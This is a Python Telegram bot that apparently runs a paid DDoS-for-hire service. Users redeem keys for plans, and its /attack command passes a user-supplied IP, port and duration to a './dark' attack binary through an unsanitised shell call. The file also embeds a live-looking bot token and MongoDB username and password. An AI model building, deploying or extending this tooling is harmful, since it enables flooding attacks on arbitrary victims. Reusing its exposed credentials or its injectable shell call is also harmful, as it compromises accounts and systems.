import os
import telebot
import time
import logging
import random
import asyncio
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
from keepalive import keep_alive
from pymongo import MongoClient

# Configuration
TOKEN = '6829329110:AAGPVN3E227OeItGgAB7SZxmI9lzAvq6r6k'
ADMIN_USER_ID = 1789079780
MONGO_URI = 'mongodb+srv://VIKASH:BadnamBadshah@cluster0.jv9he.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true' # Update with your MongoDB URI

logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)

# Initialize MongoDB Client
client = MongoClient(MONGO_URI)
db = client['VIKASH']
keys_collection = db['keys']
users_collection = db['users']

bot = telebot.TeleBot(TOKEN)
loop = asyncio.get_event_loop()

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
attack_in_progress = False

# Helper Functions
def generate_key(length=8):
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choices(chars, k=length))

def add_time(days=0):
    return (datetime.now() + timedelta(days=days)).isoformat()

def save_key(key, plan, days):
    valid_until = add_time(days=days)
    keys_collection.insert_one({"key": key, "plan": plan, "valid_until": valid_until})
    return key, valid_until

def redeem_key(user_id, key):
    global keys
    key_data = keys_collection.find_one({"key": key})
    if not key_data:
        return "Invalid key."

    valid_until = key_data['valid_until']
    plan = key_data['plan']
    users_collection.update_one({"user_id": user_id}, {"$set": {"plan": plan, "valid_until": valid_until}}, upsert=True)
    keys_collection.delete_one({"key": key})
    return f"Key redeemed successfully. Plan: {plan}, Valid Until: {valid_until}"

# Admin Commands
@bot.message_handler(commands=['genkey'])
def handle_genkey(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍\nt.me/VIP_FIGHTER_OWNER")
        return

    try:
        args = message.text.split()
        plan = int(args[1])
        days = int(args[2])
        key = generate_key()
        key, valid_until = save_key(key, plan, days)
        response = f"Key: {key}\nPlan: {plan}\nValid Until: {valid_until}"
    except Exception as e:
        logging.error(f"Error generating key: {e}")
        response = "Use /genkey 1 30"

    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def handle_redeem(message):
    user_id = message.from_user.id
    try:
        key = message.text.split()[1]
        response = redeem_key(user_id, key)
    except Exception as e:
        logging.error(f"Error redeeming key: {e}")
        response = "Use /redeem <key>."

    bot.reply_to(message, response)

# Attack Command
async def run_attack(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True
    try:
        process = await asyncio.create_subprocess_shell(f"./dark {target_ip} {target_port} {duration} 100")
        await process.communicate()
        bot.send_message(ADMIN_USER_ID, f"🛑 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋 🛑\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
    except Exception as e:
        logging.error(f"Error during attack: {e}")
    finally:
        attack_in_progress = False

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    if attack_in_progress:
        bot.reply_to(message, "⏰ 𝙒𝘼𝙄𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 ⏰")
        return

    user_data = users_collection.find_one({"user_id": user_id})
    if not user_data or user_data.get('plan', 0) == 0:
        bot.reply_to(message, "https://t.me/DarkDdosOwner")
        return

    try:
        args = message.text.split()
        target_ip, target_port, duration = args[1], int(args[2]), int(args[3])
        if target_port in blocked_ports:
            bot.reply_to(message, "Port is blocked. Use a different port.")
            return

        asyncio.run_coroutine_threadsafe(run_attack(target_ip, target_port, duration), loop)
        bot.reply_to(message, f"⚡ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 ⚡\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
    except Exception as e:
        logging.error(f"Error processing attack command: {e}")
        bot.reply_to(message, "🚀 Use /attack <IP> <Port> <Time>.")

# Welcome Message
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("ATTACK 🚀", "GENKEY 🔑", "REDEEM 🔐", "ACCOUNT 💳", "HELP 🆘")
    bot.send_message(message.chat.id, "⚡ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑 ⚡", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    if message.text == "ATTACK 🚀":
        bot.reply_to(message, "🚀 Use /attack <IP> <Port> <Time>")
    elif message.text == "REDEEM 🔐":
        bot.reply_to(message, "Use /redeem <key>")
    elif message.text == "GENKEY 🔑":
        bot.reply_to(message, "Use /genkey")        
    elif message.text == "ACCOUNT 💳":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            bot.reply_to(message, f"Plan: {plan}\nValid Until: {valid_until}")
        else:
            bot.reply_to(message, "🔑 NO ACCOUNT")
    elif message.text == "HELP 🆘":
        bot.reply_to(message, "https://t.me/DarkDdosOwner")
    else:
        bot.reply_to(message, "Invalid option.")

# Start Asyncio Loop
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == "__main__":

    # Start the keepalive server
    keep_alive()
    
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Bot is running...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(5)